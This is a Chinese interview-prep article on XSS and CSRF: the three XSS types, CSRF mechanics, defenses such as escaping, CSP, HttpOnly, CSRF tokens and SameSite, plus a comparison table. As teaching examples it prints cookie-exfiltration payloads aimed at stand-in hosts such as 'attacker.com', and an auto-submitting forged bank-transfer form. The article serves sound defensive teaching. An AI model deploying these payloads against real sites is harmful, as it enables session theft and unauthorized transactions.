<!--
question:
  id: 09.front-end-xss-csrf
  topic: 09.front-end
  difficulty: 未标
  frequency: 中频
  scenario_type: 反直觉代码
  tags: [09.front-end, XSS, xss]
-->

# XSS 与 CSRF 攻击防御深度剖析

> 一句话：XSS 是注入恶意脚本窃取用户数据，CSRF 是伪造用户身份执行非授权操作。

---

## 引子：两个亿级用户网站，都被同样的"低级漏洞"打穿

```text
案例 1（XSS）：某社交网站评论区，渲染用户输入时没用转义：
  <div>{{ user.comment }}</div>
用户输入：<script>document.location='evil.com/?c='+document.cookie</script>
→ 任何人点开这条评论都被盗 cookie

案例 2（CSRF）：某银行网站转账接口：
  POST /transfer?to=attacker&amount=10000
用户在钓鱼邮件点了链接，浏览器**自动带 cookie** 发请求 → 钱被转走
```

两种攻击**方向相反**：

- **XSS**：别人**利用你**的网站去攻击**你的用户**
- **CSRF**：别人**利用你的用户**去攻击**你的网站**

**一句话记忆**：XSS 防"内容"，CSRF 防"请求"。

## 一、核心原理

### XSS（Cross-Site Scripting）

XSS 攻击的本质是在页面中注入恶意脚本，当其他用户浏览该页面时，脚本会在其浏览器中执行，从而窃取 Cookie、会话 Token 等敏感信息。

**攻击流程：** 攻击者插入恶意脚本 → 受害者访问页面 → 脚本执行 → 窃取数据或执行恶意操作

### CSRF（Cross-Site Request Forgery）

CSRF 攻击利用用户已登录的身份，在用户不知情的情况下，以用户的名义向服务器发送伪造请求。

**攻击流程：** 用户登录网站 A → 访问攻击者网站 B → B 向 A 发送请求 → 浏览器自动携带 Cookie，服务器误以为合法

---

## 二、XSS 三种类型

### 1. 反射型 XSS

恶意脚本通过 URL 参数注入，服务器将参数内容直接返回到页面中。

```html
<!-- 攻击者构造的恶意链接 -->
https://example.com/search?q=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>

<!-- 服务器端不安全代码 -->
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>搜索结果：${query}</h1>`); // 直接拼接用户输入
});
```

**特点**：需要诱导用户点击恶意链接，恶意脚本不存储在服务器上。

### 2. 存储型 XSS

恶意脚本被存入数据库，当其他用户加载包含恶意数据的页面时被执行。危害最大。

```html
<!-- 攻击者在评论区提交恶意内容 -->
POST /comment
{"content": "<img src=x onerror=\"fetch('http://attacker.com/steal?cookie='+document.cookie)\">"}

<!-- 其他用户查看评论时 -->
<div class="comments">${comment.content}</div> <!-- 直接渲染，恶意脚本执行 -->
```

**特点**：持久化存储，影响所有访问该页面的用户。

### 3. DOM 型 XSS

前端 JavaScript 直接操作 DOM 时，将用户输入作为 HTML 或脚本执行，不经过服务器。

```javascript
// 不安全的前端代码
const hash = window.location.hash.substring(1);
document.getElementById('output').innerHTML = hash;

// 另一种常见场景
const userInput = new URLSearchParams(window.location.search).get('name');
document.write('<h1>Hello ' + userInput + '</h1>');
```

**特点**：完全在客户端发生，服务器端无法检测。

---

## 三、XSS 防御

### 1. HttpOnly Cookie

禁止 JavaScript 读取 Cookie，防止 Cookie 被盗取。

```javascript
res.cookie('sessionId', 'abc123', {
  httpOnly: true, secure: true, sameSite: 'strict'
});
```

**效果**：即使发生 XSS 攻击，攻击者也无法窃取会话 Cookie。

### 2. CSP 内容安全策略

通过 HTTP 头限制页面可以加载的资源来源，从根本上阻止恶意脚本执行。

```http
Content-Security-Policy: default-src 'self'
Content-Security-Policy: script-src 'self' https://cdn.example.com
Content-Security-Policy: script-src 'self'; object-src 'none'
```

### 3. 输入转义与输出编码

对用户输入的特殊字符进行转义，防止被解析为 HTML 或 JavaScript。

```javascript
function escapeHtml(str) {
  const map = {'&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;'};
  return str.replace(/[&<>"']/g, (char) => map[char]);
}

// HTML 上下文 - 使用 textContent 而非 innerHTML
document.getElementById('output').textContent = userInput;

// URL 上下文 - URL 编码
<a href="https://example.com?q=${encodeURIComponent(userInput)}">链接</a>
```

```java
// Java 中使用 OWASP Java Encoder
import org.owasp.encoder.Encode;
String safeHtml = Encode.forHtml(userInput);
```

**原则**：永远不要信任用户输入；根据上下文选择合适的编码方式。

---

## 四、CSRF 攻击原理

CSRF 利用浏览器自动携带 Cookie 的机制，构造跨站请求。

**表单 POST 攻击：**
```html
<form id="csrfForm" action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="toAccount" value="attacker_account" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.getElementById('csrfForm').submit();</script>
```

**GET 请求攻击：**
```html
<img src="https://bank.com/transfer?toAccount=attacker&amount=10000" width="0" height="0" />
```

**为什么能成功：** 1) 用户已登录，浏览器保存了有效 Cookie；2) 浏览器对目标网站的请求会自动携带 Cookie；3) 服务器仅通过 Cookie 验证身份，未检查请求来源。

---

## 五、CSRF 防御

### 1. CSRF Token

每次请求必须携带一次性 Token，服务器验证 Token 的有效性。

```javascript
// 服务器生成 Token
const crypto = require('crypto');
function generateCsrfToken(sessionId) {
  return crypto.createHmac('sha256', SECRET_KEY)
    .update(sessionId + Date.now()).digest('hex');
}

// 在表单中嵌入 Token
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="${csrfToken}" />
  <button type="submit">转账</button>
</form>

// 服务器验证 Token
app.post('/transfer', (req, res) => {
  const token = req.body._csrf || req.headers['x-csrf-token'];
  if (!verifyCsrfToken(req.session.id, token)) {
    return res.status(403).send('CSRF token invalid');
  }
});
```

**AJAX 请求携带 Token**：从 meta 标签获取 Token，放入请求头 `X-CSRF-Token`。

### 2. SameSite Cookie

限制 Cookie 在跨站请求中是否被携带。

```javascript
res.cookie('sessionId', 'abc123', {
  sameSite: 'strict',  // 严格模式：任何跨站请求都不携带
  secure: true         // SameSite 要求必须使用 HTTPS
});
```

| 模式 | 跨站 GET | 跨站 POST | 适用场景 |
|------|---------|-----------|----------|
| `strict` | ❌ | ❌ | 高安全需求 |
| `lax` | ✅ | ❌ | 默认推荐 |
| `none` | ✅ | ✅ | 需要跨站共享（需 HTTPS） |

### 3. Referer / Origin 检查

验证请求来源是否为可信域名。**注意**：Referer 可能被隐私插件屏蔽，不建议单独使用。

### 4. 双重 Cookie 验证

要求请求参数中包含的 Cookie 值与实际 Cookie 一致。**原理**：跨站请求无法读取目标网站的 Cookie。

---

## 六、对比表格

| 维度 | XSS | CSRF |
|------|-----|------|
| **攻击目标** | 窃取用户数据、劫持会话 | 以用户身份执行非授权操作 |
| **攻击方式** | 注入恶意脚本到页面 | 伪造跨站请求利用 Cookie |
| **是否需要登录** | 不需要 | 需要用户已登录 |
| **攻击载体** | `<script>`、`onerror`、`innerHTML` | 表单、`<img>`、`<iframe>` |
| **防御核心** | 输入转义、输出编码、CSP | CSRF Token、SameSite Cookie |
| **典型场景** | 评论框、搜索框、URL 参数 | 转账、改密、删数据 |

---

## 七、面试话术（30 秒版）

> "XSS 和 CSRF 是两种常见的 Web 安全漏洞。XSS 是在页面注入恶意脚本，分为反射型、存储型和 DOM 型三种，防御手段包括输入转义、输出编码、设置 HttpOnly Cookie 和 CSP 内容安全策略。CSRF 是利用用户已登录的 Cookie 伪造请求，防御手段主要是 CSRF Token、SameSite Cookie 和 Referer 检查。两者的核心区别是：XSS 攻击目标是窃取数据，CSRF 攻击目标是冒用身份；XSS 靠注入脚本，CSRF 靠伪造请求。在实际开发中，应该同时部署这两种防护措施。"

---

## 八、交叉引用

- 主模块：[`09.front-end`](../../../09.front-end/) — 前端知识体系
- 相关主题：[前端安全](../../../09.front-end/07-security/README.md)

## 相关章节

- 深度阅读：[`09.front-end`](../../09.front-end/README.md) — 主模块详细内容

← [返回: 咬文嚼字 · xss-csrf](README.md)
